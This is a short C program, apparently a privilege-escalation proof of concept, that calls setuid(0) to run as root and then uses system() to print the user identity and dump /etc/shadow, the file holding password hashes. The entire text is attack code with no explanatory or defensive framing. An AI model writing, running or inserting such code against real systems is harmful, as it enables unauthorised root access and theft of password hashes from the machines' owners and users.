#include<stdlib.h>
#include <unistd.h>
int main()
{
	setuid(0);//run as root
	system("id");
	system("cat /etc/shadow");
}
